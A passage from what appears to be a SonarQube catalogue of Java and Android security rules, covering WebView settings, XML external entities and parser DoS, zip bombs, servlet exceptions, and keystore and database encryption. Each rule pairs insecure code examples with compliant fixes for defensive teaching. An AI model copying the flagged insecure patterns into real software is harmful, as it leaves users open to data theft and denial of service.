<h2>Ask Yourself Whether</h2>
<ul>
  <li> No local files have to be accessed by the Webview. </li>
  <li> The WebView contains untrusted data that could cause harm when rendered. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to disable access to local files for WebViews unless it is necessary. In the case of a successful attack through a Cross-Site
Scripting vulnerability the attackers attack surface decreases drastically if no files can be read out.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.webkit.WebView;

WebView webView = (WebView) findViewById(R.id.webview);
webView.getSettings().setAllowFileAccess(true); // Sensitive
webView.getSettings().setAllowContentAccess(true); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.webkit.WebView;

WebView webView = (WebView) findViewById(R.id.webview);
webView.getSettings().setAllowFileAccess(false);
webView.getSettings().setAllowContentAccess(false);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6362">
              java:S6362
            </a>
          </td>
          <td>
            <details>
              <p>WebViews can be used to display web content as part of a mobile application. A browser engine is used to render and display the content. Like a web
application, a mobile application that uses WebViews can be vulnerable to Cross-Site Scripting if untrusted code is rendered. In the context of a
WebView, JavaScript code can exfiltrate local files that might be sensitive or even worse, access exposed functions of the application that can result
in more severe vulnerabilities such as code injection. Thus JavaScript support should not be enabled for WebViews unless it is absolutely necessary
and the authenticity of the web resources can be guaranteed.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The WebWiew only renders static web content that does not require JavaScript code to be executed. </li>
  <li> The WebView contains untrusted data that could cause harm when rendered. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to disable JavaScript support for WebViews unless it is necessary to execute JavaScript code. Only trusted pages should be
rendered.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.webkit.WebView;

WebView webView = (WebView) findViewById(R.id.webview);
webView.getSettings().setJavaScriptEnabled(true); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.webkit.WebView;

WebView webView = (WebView) findViewById(R.id.webview);
webView.getSettings().setJavaScriptEnabled(false);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6374">
              java:S6374
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=java%3AS2755&rule_key=java%3AS2755'>S2755</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>By default XML processors attempt to load all XML schemas and DTD (their locations are defined with <code>xsi:schemaLocation</code> attributes and
<code>DOCTYPE</code> declarations), potentially from an external storage such as file system or network, which may lead, if no restrictions are put in
place, to <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">server-side request forgery (SSRF)</a> vulnerabilities.</p>
<h3>Noncompliant code example</h3>
<p>For <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html">DocumentBuilder</a>, <a
href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html">SAXParser</a> and <a
href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html">Schema</a> JAPX factories:</p>
<pre>
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setValidating(true); // Noncompliant
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", true); // Noncompliant

SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setValidating(true); // Noncompliant
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", true); // Noncompliant

SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
schemaFactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", true); // Noncompliant
</pre>
<p>For <a href="https://dom4j.github.io/">Dom4j</a> library:</p>
<pre>
SAXReader xmlReader = new SAXReader(); // Noncompliant
xmlReader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", true);  // Noncompliant
</pre>
<p>For <a href="http://www.jdom.org/">Jdom2</a> library:</p>
<pre>
SAXBuilder builder = new SAXBuilder();
builder.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", true); // Noncompliant
</pre>
<h3>Compliant solution</h3>
<p>For <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html">DocumentBuilder</a>, <a
href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html">SAXParser</a> and <a
href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html">Schema</a> JAPX factories:</p>
<pre>
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
schemaFactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
</pre>
<p>For <a href="https://dom4j.github.io/">Dom4j</a> library:</p>
<pre>
SAXReader xmlReader = new SAXReader(); // Noncompliant
xmlReader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
</pre>
<p>For <a href="http://www.jdom.org/">Jdom2</a> library:</p>
<pre>
SAXBuilder builder = new SAXBuilder();
builder.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
</pre>
<h3>Exceptions</h3>
<p>This rules does not raise an issue when an <code>EntityResolver</code> is set.</p>
<pre>
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setValidating(true);
DocumentBuilder builder = factory.newDocumentBuilder();
builder.setEntityResolver(new MyEntityResolver());

SAXBuilder builder = new SAXBuilder();
builder.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", true);
builder.setEntityResolver(new EntityResolver());
</pre>
<h2>Resources</h2>
<ul>
  <li> <a
  href="https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-8CD65EF5-D113-4D5C-A564-B875C8625FAC">Oracle Java Documentation</a> - XML External Entity Injection Attack </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)">Top 10 2017 Category A4 - XML External
  Entities (XXE)</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java">OWASP XXE Prevention Cheat
  Sheet</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/611">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/827">CWE-827 - Improper Control of Document Type Definition</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5042">
              java:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul>
  <li> There is no validation of the number of entries in the archive. </li>
  <li> There is no validation of the total size of the uncompressed data. </li>
  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li>
  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>
  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
File f = new File("ZipBomb.zip");
ZipFile zipFile = new ZipFile(f);
Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries(); // Sensitive

while(entries.hasMoreElements()) {
  ZipEntry ze = entries.nextElement();
  File out = new File("./output_onlyfortesting.txt");
  Files.copy(zipFile.getInputStream(ze), out.toPath(), StandardCopyOption.REPLACE_EXISTING);
}
</pre>
<h2>Compliant Solution</h2>
<p>Do not rely on <a href="https://docs.oracle.com/javase/7/docs/api/java/util/zip/ZipEntry.html#getSize()">getsize</a> to retrieve the size of an
uncompressed entry because this method returns what is defined in the archive headers which can be forged by attackers, instead calculate the actual
entry size when unzipping it:</p>
<pre>
File f = new File("ZipBomb.zip");
ZipFile zipFile = new ZipFile(f);
Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();

int THRESHOLD_ENTRIES = 10000;
int THRESHOLD_SIZE = 1000000000; // 1 GB
double THRESHOLD_RATIO = 10;
int totalSizeArchive = 0;
int totalEntryArchive = 0;

while(entries.hasMoreElements()) {
  ZipEntry ze = entries.nextElement();
  InputStream in = new BufferedInputStream(zipFile.getInputStream(ze));
  OutputStream out = new BufferedOutputStream(new FileOutputStream("./output_onlyfortesting.txt"));

  totalEntryArchive ++;

  int nBytes = -1;
  byte[] buffer = new byte[2048];
  int totalSizeEntry = 0;

  while((nBytes = in.read(buffer)) &gt; 0) { // Compliant
      out.write(buffer, 0, nBytes);
      totalSizeEntry += nBytes;
      totalSizeArchive += nBytes;

      double compressionRatio = totalSizeEntry / ze.getCompressedSize();
      if(compressionRatio &gt; THRESHOLD_RATIO) {
        // ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack
        break;
      }
  }

  if(totalSizeArchive &gt; THRESHOLD_SIZE) {
      // the uncompressed data size is too much for the application resource capacity
      break;
  }

  if(totalEntryArchive &gt; THRESHOLD_ENTRIES) {
      // too much entries in this archive, can lead to inodes exhaustion of the system
      break;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/409">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream">CERT, IDS04-J.</a> - Safely
  extract files from ZipInputStream </li>
  <li> <a href="https://www.bamsoftware.com/hacks/zipbomb/">bamsoftware.com</a> - A better Zip Bomb </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6376">
              java:S6376
            </a>
          </td>
          <td>
            <details>
              <p>XML parsers Denial of Service attacks target XML parsers, which are software components responsible for parsing and interpreting XML documents.</p>
<h2>Why is this an issue?</h2>
<p>XML files are complex data structures. When a malicious user is able to submit an XML file, it triggers complex processing that may overwhelm the
parser. Most of the time, those complex processing are enabled by default, and XML parsers do not take preventive measures against Denial of Service
attacks.</p>
<h3>What is the potential impact?</h3>
<p>When an attacker successfully exploits the vulnerability, it can lead to a Denial of Service (DoS) condition.</p>
<h3>System Unavailability</h3>
<p>Affected system becomes unresponsive or crashes, rendering it unavailable to legitimate users. This can have severe consequences, especially for
critical systems that rely on continuous availability, such as web servers, APIs, or network services.</p>
<h3>Amplification Attacks</h3>
<p>In some cases, XML parsers Denial of Service attacks can be used as a part of larger-scale amplification attacks. By leveraging the vulnerability,
attackers can generate a disproportionately large response from the targeted system, amplifying the impact of their attack. This can result in
overwhelming network bandwidth and causing widespread disruption.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.xml.parsers.DocumentBuilderFactory;

DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.xml.parsers.DocumentBuilderFactory;

DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Java Documentation - <a
  href="https://docs.oracle.com/en/java/javase/21/docs/api/java.xml/javax/xml/parsers/DocumentBuilderFactory.html">DocumentBuilderFactory Class</a>
  </li>
  <li> Java Documentation - <a
  href="https://docs.oracle.com/en/java/javase/21/docs/api/java.xml/javax/xml/parsers/SAXParserFactory.html">SAXParserFactory Class</a> </li>
  <li> Java Documentation - <a
  href="https://docs.oracle.com/en/java/javase/21/docs/api/java.xml/javax/xml/validation/SchemaFactory.html">SchemaFactory Class</a> </li>
  <li> Java Documentation - <a
  href="https://docs.oracle.com/en/java/javase/21/docs/api/java.xml/javax/xml/transform/TransformerFactory.html">TransformerFactory Class</a> </li>
  <li> Java Documentation - <a href="https://docs.oracle.com/en/java/javase/21/security/java-api-xml-processing-jaxp-security-guide.html">Java API for
  XML Processing (JAXP) Security Guide</a> </li>
  <li> Dom4j Documentation - <a href="https://dom4j.github.io/javadoc/2.1.4/org/dom4j/io/SAXReader.html">SAXReader Class</a> </li>
  <li> Jdom2 Documentation - <a href="http://www.jdom.org/docs/apidocs/org/jdom2/input/SAXBuilder.html">SAXBuilder class</a> </li>
  <li> OWASP - <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java">XXE Prevention Cheat
  Sheet</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)">Top 10 2017 Category A4 - XML External
  Entities (XXE)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/776">CWE-776 - Improper Restriction of Recursive Entity References in DTDs ('XML Entity
  Expansion')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S1989">
              java:S1989
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Servlets are components in Java web development, responsible for processing HTTP requests and generating responses. In this context, exceptions are
used to handle and manage unexpected errors or exceptional conditions that may occur during the execution of a servlet.</p>
<p>Catching exceptions within the servlet allows us to convert them into meaningful, user-friendly messages. Otherwise, failing to catch exceptions
will propagate them to the servlet container, where the default error-handling mechanism may impact the overall security and stability of the
server.</p>
<p>Possible security problems are:</p>
<ol>
  <li> <strong>Vulnerability to denial-of-service attacks:</strong> Not caught exceptions can leave the servlet container in an unstable state, which
  can exhaust the available resources and make the system unavailable in the worst cases. </li>
  <li> <strong>Exposure of sensitive information:</strong> Exceptions handled by the servlet container, by default, expose detailed error messages or
  debugging information to the user, which may contain sensitive data such as stack traces, database connection, or system configuration. </li>
</ol>
<p>Unfortunately, servlet method signatures do not force developers to handle <code>IOException</code> and <code>ServletException</code>:</p>
<pre>
public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
}
</pre>
<p>To prevent this risk, this rule enforces all exceptions to be caught within the "do*" methods of servlet classes.</p>
<h2>How to fix it</h2>
<p>Surround all method calls that may throw an exception with a <code>try/catch</code> block.</p>
<h3>Code examples</h3>
<p>In the following example, the <code>getByName</code> method may throw an <code>UnknownHostException</code>.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
  InetAddress addr = InetAddress.getByName(request.getRemoteAddr()); // Noncompliant
  //...
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
  try {
    InetAddress addr = InetAddress.getByName(request.getRemoteAddr());
    //...
  }
  catch (UnknownHostException ex) {  // Compliant
    //...
  }
}
</pre>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/600">CWE-600 - Uncaught Exception in Servlet</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/-zZGBQ">CERT, ERR01-J.</a> - Do not allow exceptions to expose sensitive information </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6288">
              java:S6288
            </a>
          </td>
          <td>
            <details>
              <p>Android KeyStore is a secure container for storing key materials, in particular it prevents key materials extraction, i.e. when the application
process is compromised, the attacker cannot extract keys but may still be able to use them. It’s possible to enable an Android security feature, user
authentication, to restrict usage of keys to only authenticated users. The lock screen has to be unlocked with defined credentials
(pattern/PIN/password, biometric).</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application requires prohibiting the use of keys in case of compromise of the application process. </li>
  <li> The key material is used in the context of a highly sensitive application like a e-banking mobile app. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable user authentication (by setting <code>setUserAuthenticationRequired</code> to <code>true</code> during key generation)
to use keys for a limited duration of time (by setting appropriate values to <code>setUserAuthenticationValidityDurationSeconds</code>), after which
the user must re-authenticate.</p>
<h2>Sensitive Code Example</h2>
<p>Any user can use the key:</p>
<pre>
KeyGenerator keyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");

KeyGenParameterSpec builder = new KeyGenParameterSpec.Builder("test_secret_key_noncompliant", KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT) // Noncompliant
    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
    .build();

keyGenerator.init(builder);
</pre>
<h2>Compliant Solution</h2>
<p>The use of the key is limited to authenticated users (for a duration of time defined to 60 seconds):</p>
<pre>
KeyGenerator keyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");

KeyGenParameterSpec builder = new KeyGenParameterSpec.Builder("test_secret_key", KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)
    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
    .setUserAuthenticationRequired(true)
    .setUserAuthenticationParameters (60, KeyProperties.AUTH_DEVICE_CREDENTIAL)
    .build();

keyGenerator.init(builder)
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> <a href="https://developer.android.com/privacy-and-security/keystore">developer.android.com</a> - Android keystore system </li>
  <li> <a href="https://developer.android.com/privacy-and-security/keystore#UserAuthentication">developer.android.com</a> - Require user
  authentication for key use </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements">Mobile AppSec
  Verification Standard - Authentication and Session Management Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication">Mobile Top 10 2016 Category M4 - Insecure
  Authentication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/522">CWE-522 - Insufficiently Protected Credentials</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6291">
              java:S6291
            </a>
          </td>
          <td>
            <details>
              <p>Storing data locally is a common task for mobile applications. Such data includes preferences or authentication tokens for external services, among
other things. There are many convenient solutions that allow storing data persistently, for example SQLiteDatabase, SharedPreferences, and Realm. By
default these systems store the data unencrypted, thus an attacker with physical access to the device can read them out easily. Access to sensitive
data can be harmful for the user of the application, for example when the device gets stolen.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The database contains sensitive data that could cause harm when leaked. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to password-encrypt local databases that contain sensitive information. Most systems provide secure alternatives to plain-text
storage that should be used. If no secure alternative is available the data can also be encrypted manually before it is stored.</p>
<p>The encryption password should not be hard-coded in the application. There are different approaches how the password can be provided to encrypt and
decrypt the database. In the case of <code>EncryptedSharedPreferences</code> the Android Keystore can be used to store the password. Other databases
can rely on <code>EncryptedSharedPreferences</code> to store passwords. The password can also be provided dynamically by the user of the application
or it can be fetched from a remote server if the other methods are not feasible.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://developer.android.com/reference/kotlin/android/database/sqlite/SQLiteDatabase">SQLiteDatabase</a>:</p>
<pre>
SQLiteDatabase db = activity.openOrCreateDatabase("test.db", Context.MODE_PRIVATE, null); // Sensitive
</pre>
<p>For <a href="https://developer.android.com/training/data-storage/shared-preferences">SharedPreferences</a>:</p>
<pre>
SharedPreferences pref = activity.getPreferences(Context.MODE_PRIVATE); // Sensitive
</pre>
<p>For <a href="https://docs.mongodb.com/realm/">Realm</a>:</p>
<pre>
RealmConfiguration config = new RealmConfiguration.Builder().build();
Realm realm = Realm.getInstance(config); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Instead of SQLiteDatabase you can use <a href="https://www.zetetic.net/sqlcipher/sqlcipher-for-android/">SQLCipher</a>:</p>
<pre>
SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase("test.db", getKey(), null);
</pre>
<p>Instead of SharedPreferences you can use <a
href="https://developer.android.com/reference/androidx/security/crypto/EncryptedSharedPreferences">EncryptedSharedPreferences</a>:</p>
<pre>
String masterKeyAlias = new MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC);
EncryptedSharedPreferences.create(
    "secret",
    masterKeyAlias,
    context,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
);
</pre>
<p>For Realm an encryption key can be specified in the config:</p>
<pre>
RealmConfiguration config = new RealmConfiguration.Builder()
    .encryptionKey(getKey())
    .build();
Realm realm = Realm.getInstance(config);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage">Mobile Top 10 2016 Category M2</a> - Insecure Data
  Storage </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6293">
              java:S6293
            </a>
          </td>
          <td>
            <details>
              <p>Android comes with Android KeyStore, a secure container for storing key materials. It’s possible to define certain keys to be unlocked when users
authenticate using biometric credentials. This way, even if the application process is compromised, the attacker cannot access keys, as presence of
the authorized user is required.</p>
<p>These keys can be used, to encrypt, sign or create a message authentication code (MAC) as proof that the authentication result has not been
tampered with. This protection defeats the scenario where an attacker with physical access to the device would try to hook into the application
process and call the <code>onAuthenticationSucceeded</code> method directly. Therefore he would be unable to extract the sensitive data or to perform
the critical operations protected by the biometric authentication.</p>
<h2>Ask Yourself Whether</h2>
<p>The application contains:</p>
<ul>
  <li> Cryptographic keys / sensitive information that need to be protected using biometric authentication. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to tie the biometric authentication to a cryptographic operation by using a <code>CryptoObject</code> during authentication.</p>
<h2>Sensitive Code Example</h2>
<p>A <code>CryptoObject</code> is not used during authentication:</p>
<pre>
// ...
BiometricPrompt biometricPrompt = new BiometricPrompt(activity, executor, callback);
// ...
biometricPrompt.authenticate(promptInfo); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<p>A <code>CryptoObject</code> is used during authentication:</p>
<pre>
// ...
BiometricPrompt biometricPrompt = new BiometricPrompt(activity, executor, callback);
// ...
biometricPrompt.authenticate(promptInfo, new BiometricPrompt.CryptoObject(cipher)); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> <a href="https://developer.android.com/training/sign-in/biometric-auth">developer.android.com</a> - Use a cryptographic solution that depends
  on authentication </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication">Mobile Top 10 2016 Category M4 - Insecure
  Authentication</a> </li>
  <li> OWASP - <a
  href="https://mobile-security.gitbook.io/masvs/security-requirements/0x09-v4-authentication_and_session_management_requirements">Mobile AppSec
  Verification Standard - Authentication and Session Management Requirements</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/287">CWE-287 - Improper Authentication</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6301">
              java:S6301
            </a>
          </td>
          <td>
            <details>
              <p>When storing local data in a mobile application, it is common to use a database that can be encrypted. When encryption of this database is enabled,
the encryption key must be protected properly.</p>
<h2>Why is this an issue?</h2>
<p>Mobile applications often need to store data (which might be sensitive) locally. For Android, there exist several libraries that simplify this
process by offering a feature-rich database system. <a href="https://www.zetetic.net/sqlcipher/">SQLCipher</a> and <a
href="https://realm.io/">Realm</a> are examples of such libraries. These libraries often add support for database encryption, to protect the contents
from being read by other apps or by attackers.</p>
<p>When using encryption for such a database, it is important that the encryption key stays secret. If this key is hardcoded in the application, then
it should be considered compromised. The key will be known by anyone with access to the application’s binary code or source code. This means that the
sensitive encrypted data can be decrypted by anyone having access to the binary of the mobile application.</p>
<p>Furthermore, if the key is hardcoded, it is the same for every user. A compromise of this encryption key implicates every user of the app.</p>
<p>The encryption key is meant to stay secret and should not be hard-coded in the application as it would mean that:</p>
<h3>What is the potential impact?</h3>
<p>If an attacker is able to find the encryption key for the mobile database, this can potentially have severe consequences.</p>
<h4>Theft of sensitive data</h4>
<p>If a mobile database is encrypted, it is likely to contain data that is sensitive for the user or the app publisher. For example, it can contain
personally identifiable information (PII), financial data, login credentials, or other sensitive user data.</p>
